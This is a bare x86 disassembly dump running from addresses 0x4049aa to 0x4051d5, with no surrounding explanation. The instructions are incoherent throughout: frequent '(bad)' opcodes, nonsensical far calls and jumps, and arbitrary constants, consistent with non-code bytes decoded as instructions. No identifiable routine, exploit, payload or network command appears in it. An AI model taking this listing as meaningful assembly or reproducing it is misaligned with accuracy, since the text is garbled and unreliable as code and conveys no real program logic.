  4049aa:	or     DWORD PTR [edx+0x5],0x0
  4049ae:	xor    eax,0x83ffa100
  4049b3:	pop    es
  4049b4:	ds add bh,bh
  4049b7:	add    BYTE PTR [eax],al
  4049b9:	mov    esp,0xfffa0bff
  4049be:	mov    esp,0xffff0989
  4049c3:	(bad)  
  4049c4:	sbb    edi,edi
  4049c6:	(bad)  
  4049c7:	mov    edx,0x7eff5e83
  4049cc:	jge    0x4049cd
  4049ce:	in     al,dx
  4049cf:	add    ah,dl
  4049d1:	or     esp,0xffffff92
  4049d4:	aaa    
  4049d5:	mov    edi,edi
  4049d7:	dec    eax
  4049d8:	(bad)  
  4049d9:	fadd   DWORD PTR [eax]
  4049db:	mov    dl,BYTE PTR [esi-0x1]
  4049de:	or     eax,0x8300c900
  4049e3:	mov    al,BYTE PTR [eax+eax*1-0x1]
  4049e7:	push   ecx
  4049e8:	xor    esi,0xffffff83
  4049eb:	jmp    0x8a1a49fe
  4049f0:	in     al,0x83
  4049f2:	mov    DWORD PTR [ebp+0x6383835d],ebp
  4049f8:	sub    edi,0xffffffff
  4049fb:	imul   esi,DWORD PTR [eax+0x0],0xcced8399
  404a02:	(bad)  
  404a03:	mov    ebx,0x5800ff31
  404a08:	add    ah,dh
  404a0a:	add    BYTE PTR [edi],cl
  404a0c:	mov    ebp,0x700087ff
  404a11:	inc    DWORD PTR [ebx-0x7600a367]
  404a17:	mov    ebx,0xe8ffd6ff
  404a1c:	test   bh,bh
  404a1e:	xor    DWORD PTR [eax],eax
  404a20:	sbb    edi,edi
  404a22:	adc    ebx,0x64
  404a25:	(bad)  
  404a26:	push   ecx
  404a28:	cmp    DWORD PTR [edi-0x77],0x2c
  404a2c:	iret   
  404a2d:	add    ch,bh
  404a2f:	(bad)  
  404a30:	jg     0x404a31
  404a32:	adc    ecx,0xffffffaa
  404a35:	add    BYTE PTR [eax],al
  404a37:	ins    BYTE PTR es:[edi],dx
  404a38:	int3   
  404a39:	scas   eax,DWORD PTR es:[edi]
  404a3a:	(bad)  
  404a3b:	cmp    eax,0x82ccd3
  404a40:	sbb    al,BYTE PTR [eax]
  404a42:	call   FWORD PTR [esi-0x5f]
  404a45:	or     esp,0x22
  404a48:	and    DWORD PTR [ecx-0x1],0x3e
  404a4c:	mov    esp,0xb834e83
  404a51:	inc    DWORD PTR [ebx+0xcc8b11]
  404a57:	jp     0x404a58
  404a59:	mov    ds:0x9028ff,eax
  404a5e:	fmul   QWORD PTR [ecx+0x7c000073]
  404a64:	fs add bh,bh
  404a67:	mov    ah,0xcc
  404a69:	in     al,dx
  404a6a:	call   DWORD PTR [ecx+0x16]
  404a6d:	dec    DWORD PTR [esi-0x76177d]
  404a73:	or     BYTE PTR [ebx+eax*4+0x1bffb3ff],0x0
  404a7b:	ret    
  404a7c:	in     eax,0xff
  404a7e:	push   ebx
  404a7f:	mov    DWORD PTR [ebx+eax*4-0x77],ebp
  404a83:	pop    ss
  404a84:	mov    edi,edi
  404a86:	jmp    FWORD PTR [ebx-0x1]
  404a89:	retf   0xdcff
  404a8c:	repnz mov ecx,edx
  404a8f:	adc    DWORD PTR [ecx-0x21e43400],0xffffff83
  404a96:	add    BYTE PTR [ecx+0x51003583],cl
  404a9c:	lods   al,BYTE PTR ds:[esi]
  404a9d:	add    BYTE PTR [eax-0x1],bh
  404aa0:	call   0xb8f4aa5
  404aa5:	add    BYTE PTR [ebx-0x20ff02],al
  404aab:	test   eax,0x83ffffa2
  404ab0:	sbb    edi,edi
  404ab2:	int3   
  404ab3:	ss pushf 
  404ab5:	add    bh,bh
  404ab7:	stos   BYTE PTR es:[edi],al
  404ab8:	add    BYTE PTR [ebp+0x0],bl
  404abb:	neg    DWORD PTR [edx-0x1]
  404abe:	mov    ebp,0x83ff4cff
  404ac3:	push   es
  404ac4:	sub    al,BYTE PTR [ebx+0x5fff5cff]
  404aca:	add    cl,cl
  404acc:	pop    ds
  404acd:	jmp    ebx
  404acf:	dec    DWORD PTR [ecx]
  404ad1:	inc    DWORD PTR [eax]
  404ad3:	icebp  
  404ad4:	mov    eax,0x8364ffff
  404ad9:	sbb    eax,0x83c336ff
  404ade:	inc    esp
  404adf:	(bad)  
  404ae0:	jge    0x404ae2
  404ae2:	call   FWORD PTR [eax+0x3d000039]
  404ae8:	mov    DWORD PTR [esi+0x2685ff],esp
  404aee:	sbb    bh,bh
  404af0:	pop    ds
  404af1:	add    DWORD PTR [ebx-0x99e8],0x64
  404af8:	(bad)  
  404af9:	cli    
  404afa:	int3   
  404afb:	mov    dl,0xbf
  404afd:	push   ecx
  404aff:	add    BYTE PTR [ecx],dl
  404b01:	add    BYTE PTR [eax],al
  404b03:	push   cs
  404b04:	dec    edx
  404b05:	(bad)  
  404b06:	inc    DWORD PTR [ecx]
  404b08:	add    edx,0xffffffff
  404b0b:	or     al,0x7f
  404b0d:	push   DWORD PTR [edi+edi*8+0x60]
  404b11:	add    ah,cl
  404b13:	retf   0xffba
  404b16:	push   esp
  404b18:	dec    DWORD PTR [edx]
  404b1a:	call   DWORD PTR [edx]
  404b1c:	jmp    DWORD PTR es:[ecx]
  404b1f:	add    BYTE PTR [eax-0x34],al
  404b22:	sub    DWORD PTR [ebp-0x2f],0x0
  404b26:	mov    esp,esp
  404b28:	xor    ebx,0xffffffff
  404b2b:	jp     0x404b35
  404b2d:	add    al,ah
  404b2f:	or     eax,0x0
  404b32:	jmp    FWORD PTR [edx]
  404b34:	ret    0xffff
  404b37:	(bad)  
  404b38:	call   FWORD PTR [eax-0xf79a01]
  404b3e:	jle    0x404b3f
  404b40:	jmp    0x0:0xf259ff00
  404b47:	push   esi
  404b48:	push   DWORD PTR [esi]
  404b4a:	call   FWORD PTR [edi+0x2d]
  404b4d:	dec    DWORD PTR [ebx]
  404b4f:	(bad)  
  404b50:	jnp    0x404ad5
  404b52:	add    DWORD PTR [ebx],0xffffffdc
  404b55:	(bad)  
  404b56:	(bad)  
  404b57:	fdiv   st(7),st
  404b59:	jne    0x404b5a
  404b5b:	add    edi,DWORD PTR [ebx+0x120031ff]
  404b61:	inc    DWORD PTR [eax]
  404b63:	push   edx
  404b64:	fiadd  WORD PTR [eax]
  404b66:	call   DWORD PTR [esi]
  404b68:	(bad)  
  404b69:	out    dx,al
  404b6a:	jmp    DWORD PTR [edx+0x2]
  404b6d:	dec    esi
  404b6f:	add    BYTE PTR [ebp+0x5526cccc],cl
  404b75:	int3   
  404b76:	and    DWORD PTR [ebp-0x7d],0xffffffd7
  404b7a:	(bad)  
  404b7b:	jmp    0x404bb2
  404b7d:	sub    DWORD PTR [edx-0xff9001],0x5a
  404b84:	test   eax,0x2cff83
  404b89:	imul   eax,DWORD PTR [ebx+0x6dff6a91],0x0
  404b90:	cdq    
  404b91:	inc    DWORD PTR [eax]
  404b93:	cmp    BYTE PTR [eax+eax*1-0x43ff7001],dh
  404b9a:	adc    DWORD PTR [esi-0x40],0x0
  404b9e:	popa   
  404b9f:	inc    DWORD PTR [eax]
  404ba1:	inc    DWORD PTR [ebx+0xf37a]
  404ba7:	pop    ecx
  404ba8:	or     DWORD PTR [edx],0xffffffff
  404bab:	sbb    eax,0xff47ff83
  404bb0:	or     edi,edi
  404bb2:	(bad)  
  404bb3:	aas    
  404bb4:	cmp    bh,0xff
  404bb7:	call   0xff6a:0xe0833000
  404bbe:	inc    esp
  404bbf:	add    BYTE PTR [ebp+0x0],dh
  404bc2:	adc    DWORD PTR [edi+edx*4-0x33390100],0xffffffc2
  404bca:	push   DWORD PTR [ecx]
  404bcc:	mov    dl,0xcc
  404bce:	xchg   esp,eax
  404bcf:	dec    eax
  404bd1:	or     esp,0xffffffa3
  404bd4:	dec    esp
  404bd5:	add    DWORD PTR [eax],0xffffff81
  404bd8:	sbb    edi,0xffffff83
  404bdb:	or     eax,0x836cffff
  404be0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404be1:	add    BYTE PTR [eax],al
  404be3:	in     eax,0x83
  404be5:	add    BYTE PTR [ecx-0x7cb900be],cl
  404beb:	mov    ecx,0x892bffea
  404bf0:	pop    ecx
  404bf1:	int3   
  404bf2:	sbb    DWORD PTR [eax],0xffffff94
  404bf5:	add    BYTE PTR [eax],al
  404bf7:	push   ecx
  404bf8:	jmp    DWORD PTR [edx-0x646b01]
  404bfe:	aam    0x83
  404c00:	cld    
  404c01:	mov    DWORD PTR [ebx-0x5b09],eax
  404c07:	mov    cl,0x89
  404c09:	xchg   esp,ecx
  404c0b:	pop    ds
  404c0c:	dec    eax
  404c0d:	int3   
  404c0e:	push   0x0
  404c10:	or     al,0x83
  404c12:	add    BYTE PTR [edi],bl
  404c14:	out    0xff,eax
  404c16:	add    BYTE PTR [edi-0x1],bh
  404c19:	pop    es
  404c1a:	call   DWORD PTR [ecx-0x25]
  404c1d:	or     DWORD PTR [edx-0x34],0xffffffea
  404c21:	(bad)  
  404c22:	(bad)  
  404c23:	fadd   st(4),st
  404c25:	add    bh,bh
  404c27:	std    
  404c28:	push   DWORD PTR [eax]
  404c2a:	call   DWORD PTR [edi-0x1a]
  404c2d:	add    BYTE PTR [eax+eax*1],bh
  404c30:	or     al,BYTE PTR [ebx-0x7c2b357d]
  404c36:	(bad)  
  404c37:	out    dx,eax
  404c38:	(bad)  
  404c39:	mov    eax,0xff21b4ff
  404c3e:	out    dx,eax
  404c3f:	(bad)  
  404c40:	in     eax,dx
  404c41:	dec    DWORD PTR [ecx-0x7c038b]
  404c47:	xor    eax,0x5001c89
  404c4c:	iret   
  404c4d:	(bad)  
  404c4e:	fdivr  st,st(7)
  404c50:	add    al,0x83
  404c52:	jmp    eax
  404c54:	mov    ch,0xff
  404c56:	jmp    DWORD PTR [eax]
  404c58:	add    BYTE PTR [edi-0x1],ch
  404c5b:	xchg   ebp,eax
  404c5c:	mov    bh,0xff
  404c5e:	mov    ds:0xcccc92ff,al
  404c63:	mov    bl,BYTE PTR [ecx-0x77]
  404c66:	call   DWORD PTR [ebp-0x1]
  404c69:	cwde   
  404c6a:	add    BYTE PTR [ebx],bl
  404c6c:	or     DWORD PTR [ecx-0x11ff8a],0xffffffff
  404c73:	scas   al,BYTE PTR es:[edi]
  404c74:	sub    edi,edi
  404c76:	int3   
  404c77:	dec    ebp
  404c78:	add    dl,dh
  404c7a:	add    BYTE PTR [eax-0x4],ch
  404c7d:	jmp    esp
  404c7f:	int3   
  404c80:	mov    bl,0x0
  404c82:	mov    DWORD PTR [edi+0xdccffb3],esi
  404c88:	int3   
  404c89:	mov    esp,0xccd5fbff
  404c8e:	or     edi,edi
  404c90:	xchg   edx,eax
  404c91:	add    BYTE PTR [ecx+0xd763],cl
  404c97:	sbb    eax,0xf4ff5aff
  404c9c:	push   ebp
  404c9d:	dec    DWORD PTR [edx]
  404c9f:	dec    DWORD PTR [ecx]
  404ca1:	(bad)  
  404ca2:	jmp    DWORD PTR [ebx-0x34]
  404ca5:	add    BYTE PTR [ebx+0x28ffdd],al
  404cab:	mov    ds:0x83daff12,al
  404cb0:	mov    ah,0xcc
  404cb2:	(bad)  
  404cb3:	fisubr WORD PTR [esi-0x1]
  404cb6:	int3   
  404cb7:	jmp    0x4a3ff6bb
  404cbc:	repz dec DWORD PTR [eax-0x7d]
  404cc0:	(bad)  
  404cc1:	inc    DWORD PTR [ebx-0x767cb849]
  404cc7:	cmp    bh,0x1d
  404cca:	add    BYTE PTR [edx-0x7c],cl
  404ccd:	inc    DWORD PTR [eax+0xff9b00]
  404cd3:	test   DWORD PTR [edi+edi*8+0x47ffc800],0xff878483
  404cde:	sti    
  404cdf:	dec    DWORD PTR [esi]
  404ce1:	inc    DWORD PTR [eax]
  404ce3:	test   ebx,ecx
  404ce5:	inc    DWORD PTR [ebx+0xd8cca1]
  404ceb:	pop    esp
  404cec:	jge    0x404cba
  404cee:	mov    ebx,0xff83d5cc
  404cf3:	jle    0x404c98
  404cf5:	inc    DWORD PTR [eax]
  404cf7:	in     eax,0xcc
  404cf9:	or     ecx,DWORD PTR [ecx+0x75ffc16a]
  404cff:	add    BYTE PTR [ebp-0x1],ah
  404d02:	add    BYTE PTR [eax+esi*2],ah
  404d05:	add    BYTE PTR [eax],al
  404d07:	inc    esi
  404d08:	adc    DWORD PTR [eax],0xffffffff
  404d0b:	into   
  404d0c:	scas   eax,DWORD PTR es:[edi]
  404d0d:	add    BYTE PTR [ebx],bh
  404d0f:	add    BYTE PTR [ebx+0x634483ff],bh
  404d15:	(bad)  
  404d16:	inc    eax
  404d18:	mov    DWORD PTR [esi-0x7c9b1601],ebx
  404d1e:	mov    esp,0xffff73ff
  404d23:	pop    es
  404d24:	inc    ebx
  404d25:	cmp    edi,0xffffff89
  404d28:	add    BYTE PTR [esi+0xe314ff],bh
  404d2e:	jae    0x404d2f
  404d30:	dec    edi
  404d31:	add    BYTE PTR [ebx-0xff4850],al
  404d37:	pop    ebp
  404d38:	inc    DWORD PTR [ebp-0xbba000]
  404d3e:	mov    edi,0xff2aff
  404d43:	xchg   esp,eax
  404d44:	push   eax
  404d45:	(bad)  
  404d46:	inc    DWORD PTR [ebx+0x0]
  404d49:	nop
  404d4a:	(bad)  
  404d4b:	mov    eax,0xd2ffd3
  404d50:	(bad)  
  404d52:	(bad)  
  404d53:	sti    
  404d54:	mov    edi,0x830eff00
  404d59:	pop    esi
  404d5a:	(bad)  
  404d5b:	out    dx,eax
  404d5c:	inc    ebp
  404d5d:	mov    DWORD PTR [ecx-0x1],ecx
  404d60:	sar    edi,0x0
  404d63:	ret    0x7e
  404d66:	inc    DWORD PTR [edx]
  404d68:	mov    DWORD PTR [ebp+0xfa3100],ebx
  404d6e:	or     edi,edi
  404d70:	and    eax,0xb7683ff
  404d75:	cmp    edi,0xffffff96
  404d78:	mov    DWORD PTR [edi-0x912701],esi
  404d7e:	pop    ecx
  404d7f:	xor    DWORD PTR [ebp+0x4f30ffff],0xffffff83
  404d86:	int3   
  404d87:	mov    al,ds:0x7500adff
  404d8c:	je     0x404d8d
  404d8e:	mov    al,0x0
  404d90:	jge    0x404d5e
  404d92:	int3   
  404d93:	stc    
  404d94:	(bad)  
  404d96:	add    BYTE PTR [eax+eax*1+0x2f],dl
  404d9a:	jmp    FWORD PTR ds:0xa1ccee
  404da0:	push   ds
  404da1:	int3   
  404da2:	add    cl,ch
  404da4:	loopne 0x404da5
  404da6:	add    BYTE PTR [eax-0x77],dh
  404da9:	loope  0x404d2e
  404dab:	int3   
  404dac:	mov    eax,ds:0x89ff94ff
  404db1:	add    BYTE PTR [eax],al
  404db3:	push   esp
  404db4:	mov    DWORD PTR [eax],0xbe004600
  404dba:	mov    DWORD PTR [eax+0x20],ebx
  404dbd:	inc    DWORD PTR [edi-0x330b01]
  404dc3:	loop   0x404e0d
  404dc5:	add    BYTE PTR [eax],al
  404dc7:	sub    bh,bh
  404dc9:	sub    edi,edi
  404dcb:	in     al,dx
  404dcc:	js     0x404dcd
  404dce:	or     cl,ah
  404dd0:	lahf   
  404dd1:	add    BYTE PTR [eax],al
  404dd3:	adc    ecx,esi
  404dd5:	add    bh,bh
  404dd7:	and    eax,0x8000cd00
  404ddc:	test   al,0xff
  404dde:	fdiv   st(7),st
  404de0:	out    0xff,al
  404de2:	int3   
  404de3:	adc    BYTE PTR [ebp-0x6c0100],bh
  404de9:	dec    ebp
  404dea:	jmp    FWORD PTR [ebp+eax*2-0x3376f201]
  404df1:	inc    DWORD PTR [eax]
  404df3:	fs cmp edi,edi
  404df6:	(bad)  
  404df7:	out    dx,al
  404df8:	jmp    esp
  404dfa:	add    BYTE PTR [ebp+ebx*1+0x2bffc400],al
  404e01:	inc    DWORD PTR [ebx-0x7cffb4ae]
  404e07:	cld    
  404e08:	add    ah,al
  404e0a:	(bad)  
  404e0b:	jl     0x404dd3
  404e0d:	add    bl,dh
  404e0f:	add    BYTE PTR [ecx+0x65daffff],dl
  404e15:	add    bh,bh
  404e17:	fdivr  st,st(7)
  404e19:	dec    eax
  404e1a:	add    BYTE PTR [eax-0x4f],dh
  404e1d:	call   DWORD PTR [esi+0x2dff]
  404e23:	push   edx
  404e24:	push   0x0
  404e26:	call   DWORD PTR [ecx-0x35004a00]
  404e2c:	add    eax,0xf700beff
  404e31:	add    bh,bh
  404e33:	std    
  404e34:	idiv   bh
  404e36:	add    BYTE PTR [edi+edi*8],dl
  404e39:	push   edx
  404e3a:	jmp    FWORD PTR [esi-0x6]
  404e3d:	add    BYTE PTR [ebx],bl
  404e3f:	mov    DWORD PTR [esi-0x1654ff7d],esp
  404e45:	add    BYTE PTR [ecx-0x3332ff48],cl
  404e4b:	inc    edi
  404e4c:	dec    esi
  404e4d:	int3   
  404e4e:	pop    ss
  404e4f:	push   DWORD PTR [ebp+0x53f0ffff]
  404e55:	inc    DWORD PTR [eax]
  404e57:	add    DWORD PTR [eax],0xb2200b8
  404e5d:	push   DWORD PTR [ebx]
  404e5f:	inc    esp
  404e61:	add    bh,bh
  404e63:	out    dx,al
  404e64:	jge    0x404e65
  404e66:	jmp    ecx
  404e68:	add    BYTE PTR [esi-0xcd3501],cl
  404e6e:	(bad)  
  404e6f:	(bad)  
  404e70:	jnp    0x404e71
  404e72:	mov    DWORD PTR [edx+esi*8],esi
  404e75:	mov    DWORD PTR [eax],eax
  404e77:	or     al,0xff
  404e79:	cmp    ecx,esp
  404e7b:	nop
  404e7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e7d:	mov    DWORD PTR [ecx+0xde83],esp
  404e83:	cmp    cl,dl
  404e85:	add    BYTE PTR [eax],al
  404e87:	mov    esi,0x5eccdc83
  404e8c:	mov    dl,0x0
  404e8e:	(bad)  
  404e91:	add    bh,bh
  404e93:	(bad)  
  404e94:	(bad)  
  404e95:	dec    DWORD PTR [ecx-0xd53345]
  404e9b:	out    dx,al
  404e9c:	popf   
  404e9d:	add    BYTE PTR [ecx+0x0],al
  404ea0:	mov    edi,edi
  404ea2:	add    al,al
  404ea4:	aam    0xff
  404ea6:	jmp    DWORD PTR [ebx-0x1]
  404ea9:	dec    edi
  404eaa:	add    BYTE PTR [edx+0x2d002e],bh
  404eb0:	ja     0x404e3b
  404eb2:	add    BYTE PTR [eax-0x4e],ah
  404eb5:	mov    DWORD PTR [ebx-0x6e0006],eax
  404ebb:	les    esp,FWORD PTR [ebx-0x1]
  404ebe:	mov    bh,0x83
  404ec0:	mov    al,BYTE PTR [eax]
  404ec2:	add    BYTE PTR [ebx+0x3b],dl
  404ec5:	or     esp,0xffffffbc
  404ec8:	int3   
  404ec9:	sar    bh,0x7c
  404ecc:	mov    ah,0xff
  404ece:	std    
  404ecf:	(bad)  
  404ed0:	jge    0x404ed1
  404ed2:	dec    DWORD PTR [edi-0x36ffff82]
  404ed8:	add    BYTE PTR [eax+eax*1-0x73],cl
  404edc:	lahf   
  404edd:	inc    DWORD PTR [ebx-0x1]
  404ee0:	outs   dx,DWORD PTR ds:[esi]
  404ee1:	add    BYTE PTR [eax],al
  404ee3:	or     eax,0xc4ffff1d
  404ee8:	add    BYTE PTR [edx-0x1],ch
  404eeb:	mov    ds:0xffa7004c,al
  404ef0:	sub    al,0xff
  404ef2:	xor    DWORD PTR [ebp+0x1a],0x0
  404ef6:	add    BYTE PTR [ebx-0x77],ah
  404ef9:	call   0xffd6:0x83acbd83
  404f00:	xchg   BYTE PTR [ecx-0x7c64ae01],cl
  404f06:	int3   
  404f07:	test   eax,0x2c004bff
  404f0c:	pop    esp
  404f0d:	mov    DWORD PTR [edi],edx
  404f0f:	inc    DWORD PTR [ebx+0x0]
  404f12:	int3   
  404f13:	shl    DWORD PTR [esi],1
  404f15:	(bad)  
  404f16:	jmp    FWORD PTR [ebx]
  404f18:	(bad)  
  404f19:	jmp    0x4d:0x89fd1883
  404f20:	push   ds
  404f21:	int3   
  404f22:	add    BYTE PTR [esi-0x7b],al
  404f25:	add    BYTE PTR [eax],al
  404f27:	adc    eax,0xedff59ff
  404f2c:	xlat   BYTE PTR ds:[ebx]
  404f2d:	(bad)  
  404f2e:	notrack call DWORD PTR [esi-0x1]
  404f32:	jmp    esp
  404f34:	xor    al,0x0
  404f36:	call   FWORD PTR [esi-0x1]
  404f39:	add    edi,edi
  404f3b:	jmp    0x404f4c
  404f3d:	inc    DWORD PTR [edx-0x7c7c8000]
  404f43:	ins    BYTE PTR es:[edi],dx
  404f44:	(bad)  
  404f46:	dec    DWORD PTR [edi+0x0]
  404f49:	mov    ebp,0xffee5700
  404f4e:	call   0x9abc:0x83006cff
  404f55:	inc    DWORD PTR [eax]
  404f57:	dec    esp
  404f58:	or     edx,0xffffffff
  404f5b:	xor    edx,DWORD PTR [eax+0x1cffae89]
  404f61:	(bad)  
  404f62:	push   DWORD PTR [edi+0x47]
  404f65:	add    ah,cl
  404f67:	aas    
  404f68:	inc    DWORD PTR [ebx]
  404f6a:	dec    DWORD PTR [edx+0x5e]
  404f6d:	add    BYTE PTR [edi+edi*8+0x48],ch
  404f71:	dec    esp
  404f73:	cmp    al,0x2e
  404f75:	(bad)  
  404f76:	call   DWORD PTR [esi]
  404f78:	add    BYTE PTR [esi],ah
  404f7a:	and    edi,0x3
  404f7d:	or     DWORD PTR [esi-0x77],0xffffff8d
  404f81:	(bad)  
  404f82:	dec    DWORD PTR [edx]
  404f84:	sub    eax,0x83b18983
  404f89:	test   al,0x0
  404f8b:	mov    dh,0x8
  404f8d:	xor    eax,0xffffffff
  404f90:	sar    bh,cl
  404f92:	or     esi,0xffffffb1
  404f95:	(bad)  
  404f96:	jmp    DWORD PTR [edx-0x1]
  404f99:	sub    al,0xff
  404f9b:	xchg   ebx,eax
  404f9c:	int3   
  404f9d:	dec    DWORD PTR [edi+edi*8+0x36]
  404fa1:	mov    DWORD PTR [ebx-0x76003195],eax
  404fa7:	mov    DWORD PTR [ebx+0x5d1983b1],0xc500c1ff
  404fb1:	int3   
  404fb2:	jmp    FWORD PTR [ebx]
  404fb4:	test   eax,0xff580000
  404fb9:	mov    WORD PTR [ebx-0x4bff0fa5],es
  404fbf:	mov    ecx,ecx
  404fc1:	int3   
  404fc2:	add    BYTE PTR [ebp-0x21],cl
  404fc5:	add    bh,bh
  404fc7:	sar    bh,1
  404fc9:	add    BYTE PTR [ebx-0x74ff77d2],al
  404fcf:	jmp    FWORD PTR [ebp-0x1]
  404fd2:	push   DWORD PTR [ebx]
  404fd4:	mov    cl,0x0
  404fd6:	add    BYTE PTR [eax-0x1],al
  404fd9:	pushf  
  404fda:	dec    DWORD PTR [esi]
  404fdc:	jg     0x404faa
  404fde:	imul   eax,DWORD PTR [eax],0x4cffffa8
  404fe4:	sahf   
  404fe5:	add    BYTE PTR [eax],al
  404fe7:	mov    ds:0x1affddff,al
  404fec:	mov    bh,0x0
  404fee:	jo     0x404fbc
  404ff0:	ret    0xff
  404ff3:	or     al,0x8b
  404ff5:	mov    edi,edi
  404ff7:	aaa    
  404ff8:	dec    DWORD PTR [edx-0x956800]
  404ffe:	push   cs
  404fff:	sbb    DWORD PTR [edi+0x42608983],0xffffffff
  405006:	xor    DWORD PTR [ecx-0x34006201],0x77
  40500d:	add    bh,ch
  40500f:	inc    eax
  405011:	(bad)  
  405012:	call   FWORD PTR [esi-0x12]
  405015:	add    ah,cl
  405017:	add    BYTE PTR fs:[eax-0x82537d],ah
  40501e:	dec    ebx
  40501f:	int3   
  405020:	cmp    al,0xff
  405022:	add    DWORD PTR [esp+edi*8],0xffffff83
  405026:	add    bh,dl
  405028:	jmp    FWORD PTR [eax+0x0]
  40502b:	xlat   BYTE PTR ds:[ebx]
  40502c:	push   ebp
  40502d:	inc    DWORD PTR [ebp+0x8329ff]
  405033:	mov    ds:0xfcffff74,al
  405038:	dec    DWORD PTR [esi]
  40503a:	call   FWORD PTR [edi]
  40503c:	push   es
  40503d:	push   DWORD PTR [ebx]
  40503f:	add    ah,dl
  405041:	cmp    edi,0x32
  405044:	aaa    
  405045:	inc    DWORD PTR [ebx+0x7400b0]
  40504b:	lods   eax,DWORD PTR ds:[esi]
  40504c:	lods   al,BYTE PTR ds:[esi]
  40504d:	call   FWORD PTR [ebx-0x33ff9a01]
  405053:	lods   eax,DWORD PTR ds:[esi]
  405054:	jle    0x405022
  405056:	cmp    DWORD PTR [ebp-0x35fff47d],0xffffffc3
  40505d:	add    BYTE PTR [eax-0x7d],cl
  405060:	jo     0x405062
  405062:	push   DWORD PTR [esp+ebp*1-0x1]
  405066:	inc    DWORD PTR [edi]
  405068:	add    ch,cl
  40506a:	call   DWORD PTR [ecx]
  40506c:	inc    ecx
  40506d:	jmp    edx
  40506f:	add    BYTE PTR [ebx],ch
  405071:	cmp    edi,0x16
  405074:	adc    al,0xff
  405076:	push   DWORD PTR [esi]
  405078:	jmp    DWORD PTR [ebx+0x0]
  40507b:	std    
  40507c:	test   al,0x0
  40507e:	dec    edi
  40507f:	(bad)  
  405080:	cmp    BYTE PTR [ebx-0xf84b7d],al
  405086:	add    BYTE PTR [eax],dh
  405088:	(bad)  
  405089:	js     0x405057
  40508b:	out    0xcf,al
  40508d:	add    BYTE PTR [edi-0x1],ah
  405090:	or     eax,0x224900ff
  405095:	add    DWORD PTR [eax],0xffffffec
  405098:	push   DWORD PTR [ebp-0x85e301]
  40509e:	mov    bh,bh
  4050a0:	bound  eax,QWORD PTR [eax]
  4050a2:	int3   
  4050a3:	add    edx,esi
  4050a5:	(bad)  
  4050a6:	push   DWORD PTR [esi+0x7cff42ff]
  4050ac:	cmc    
  4050ad:	call   DWORD PTR [ecx]
  4050af:	int3   
  4050b0:	and    BYTE PTR [eax],al
  4050b2:	call   edi
  4050b4:	fwait
  4050b5:	(bad)  
  4050b6:	call   DWORD PTR [esi+0x0]
  4050b9:	nop
  4050ba:	jmp    DWORD PTR [ecx-0x15]
  4050bd:	add    ecx,0x0
  4050c0:	xchg   ecx,eax
  4050c1:	(bad)  
  4050c2:	jmp    FWORD PTR [ebp+0x6c]
  4050c5:	inc    DWORD PTR [eax]
  4050c7:	imul   eax,DWORD PTR [eax],0xbddecc88
  4050cd:	jmp    DWORD PTR [eax+0x0]
  4050d0:	aaa    
  4050d1:	add    bh,bh
  4050d3:	inc    eax
  4050d4:	test   eax,0x1100ff
  4050d9:	mov    bl,0xff
  4050db:	retf   
  4050dc:	cli    
  4050dd:	push   DWORD PTR [ebx-0x1]
  4050e0:	push   cs
  4050e1:	retf   0xff3f
  4050e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4050e5:	sub    edx,ebx
  4050e7:	add    BYTE PTR [edx-0x7d],bl
  4050ea:	(bad)  
  4050eb:	inc    DWORD PTR [eax]
  4050ed:	or     esp,0x0
  4050f0:	mov    eax,ds:0xfecc4819
  4050f5:	xchg   DWORD PTR [ecx-0x3300bdc2],esp
  4050fb:	inc    DWORD PTR [ebx-0x33760001]
  405101:	mov    ecx,DWORD PTR ds:0x33f34cc
  405107:	jmp    0x405161
  405109:	int3   
  40510a:	add    DWORD PTR [eax],0x0
  40510d:	(bad)  
  40510e:	inc    DWORD PTR [ebx+0x129cb0]
  405114:	sub    DWORD PTR [eax],eax
  405116:	jle    0x405180
  405118:	nop
  405119:	(bad)  
  40511a:	dec    DWORD PTR [ecx-0x1]
  405120:	arpl   WORD PTR [esp+ecx*1],bp
  405123:	mov    DWORD PTR [ecx+0x603d785e],edx
  405129:	inc    DWORD PTR [ebx-0x7cffff7d]
  40512f:	inc    DWORD PTR [ecx+0x6c]
  405132:	cmp    BYTE PTR [eax],al
  405134:	(bad)  
  405135:	jmp    0x405167
  405137:	(bad)  
  405139:	cmp    edi,0x0
  40513c:	dec    esp
  40513e:	or     esp,0x45
  405141:	dec    eax
  405142:	retf   
  405143:	sub    DWORD PTR [edx],0x37
  405146:	pop    ds
  405147:	jns    0x4050ee
  405149:	(bad)  
  40514a:	dec    esp
  40514c:	add    bh,bh
  40514e:	add    BYTE PTR [ecx+0x517839],cl
  405154:	pop    edx
  405155:	cld    
  405156:	cmp    eax,0xccfffcd8
  40515b:	(bad)  
  40515c:	inc    DWORD PTR [eax]
  40515e:	(bad)  
  40515f:	call   FWORD PTR [ebx]
  405161:	mov    ah,0xaf
  405163:	jmp    FWORD PTR [ecx]
  405165:	mov    BYTE PTR [ebx],dl
  405167:	xor    al,0x35
  405169:	add    BYTE PTR [ecx-0x1],cl
  40516f:	dec    ebp
  405171:	popa   
  405172:	hlt    
  405173:	inc    DWORD PTR [edi+0x72]
  405176:	push   ebp
  405177:	xchg   edi,eax
  405178:	add    edi,edi
  40517a:	inc    DWORD PTR [eax]
  40517c:	(bad)  
  40517d:	inc    DWORD PTR [eax]
  40517f:	add    BYTE PTR [edx+0xd],bl
  405182:	test   bh,bh
  405184:	fisttp QWORD PTR [edi-0x7c]
  405187:	and    al,0x3f
  405189:	add    bh,bh
  40518b:	add    BYTE PTR [eax],al
  40518d:	mov    DWORD PTR [ebx-0x38199b01],eax
  405193:	call   esp
  405195:	or     al,0x9c
  405197:	mov    ds:0xff89cc21,al
  40519c:	(bad)  
  40519d:	(bad)  
  40519e:	inc    DWORD PTR [eax]
  4051a0:	les    eax,FWORD PTR ds:0xbda08357
  4051a6:	cmovp  ebp,edi
  4051a9:	(bad)  
  4051aa:	inc    DWORD PTR [eax]
  4051ac:	add    bh,bh
  4051ae:	add    DWORD PTR [eax],0x60
  4051b1:	ins    DWORD PTR es:[edi],dx
  4051b2:	rol    BYTE PTR [ebx+0x12783c9f],1
  4051b8:	call   0xff83:0xccffff
  4051bf:	add    BYTE PTR [edi+0x5eff860d],bh
  4051c5:	dec    edx
  4051c6:	es call 0xff83:0xf8
  4051ce:	add    BYTE PTR [eax],al
  4051d0:	jae    0x4051d7
  4051d2:	cwde   
  4051d3:	add    dh,bl
  4051d5:	mov    bl,0xf8
